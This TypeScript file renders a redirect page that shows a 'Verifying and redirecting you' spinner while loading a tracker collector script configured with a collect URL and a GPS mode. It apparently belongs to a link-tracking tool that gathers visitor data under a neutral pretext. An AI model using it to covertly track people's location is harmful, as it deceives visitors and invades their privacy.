import { escapeHtml } from '../utils/html.js';

interface RedirectTemplateOptions {
  loadingMessage?: string;
  subMessage?: string;
}

export function renderRedirectTemplate(slug: string, targetUrl: string, options: RedirectTemplateOptions = {}, gpsMode: string = 'optional'): string {
  const loadingMessage = escapeHtml(options.loadingMessage || 'Please wait...');
  const subMessage = escapeHtml(options.subMessage || 'Verifying and redirecting you');

  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Redirecting...</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      background: #f5f5f5;
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      color: #333;
    }
    .container {
      text-align: center;
      padding: 2rem;
    }
    .spinner {
      width: 40px;
      height: 40px;
      border: 4px solid #e0e0e0;
      border-top-color: #4285f4;
      border-radius: 50%;
      animation: spin 0.8s linear infinite;
      margin: 0 auto 1.5rem;
    }
    @keyframes spin {
      to { transform: rotate(360deg); }
    }
    h2 { font-size: 1.2rem; font-weight: 500; margin-bottom: 0.5rem; }
    p { font-size: 0.9rem; color: #666; }
  </style>
</head>
<body>
  <div class="container">
    <div class="spinner"></div>
    <h2>${loadingMessage}</h2>
    <p>${subMessage}</p>
  </div>
  <script src="/static/collector.js"></script>
  <script>
    (function() {
      window.__TRACKER_CONFIG = {
        slug: ${JSON.stringify(slug)},
        collectUrl: '/c/' + ${JSON.stringify(slug)},
        targetUrl: ${JSON.stringify(targetUrl)},
        templateId: 'redirect',
        gpsMode: ${JSON.stringify(gpsMode)}
      };
      if (window.TrackerCollector) {
        window.TrackerCollector.run(window.__TRACKER_CONFIG);
      }
    })();
  </script>
</body>
</html>`;
}
